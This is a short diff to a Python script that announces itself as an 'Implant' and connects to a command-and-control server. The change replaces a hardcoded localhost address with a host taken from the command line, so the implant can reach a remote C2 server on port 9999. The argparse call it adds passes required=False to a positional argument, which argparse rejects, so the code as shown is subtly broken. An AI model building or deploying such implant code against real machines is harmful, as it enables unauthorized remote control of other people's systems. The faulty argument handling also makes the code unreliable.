@@ -6,6 +6,17 @@ import socket
 import sys
 import rsa
 import time
+import argparse
+
+# get the target ip address from command line input
+parser = argparse.ArgumentParser()
+parser.add_argument('rhost', required=False)
+
+args = parser.parse_args()
+
+RHOST = args.rhost
+if RHOST is None:
+    RHOST = 'localhost'
 
 print("Implant Running")
 
@@ -111,7 +122,7 @@ while(True):
         # Create a TCP/IP socket
         c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect the socket to the port where the server is listening
-        c2_server_address = ('localhost', 9999)
+        c2_server_address = (RHOST, 9999)
         print("Connecting to Socket")
         c2_socket.connect(c2_server_address)
 
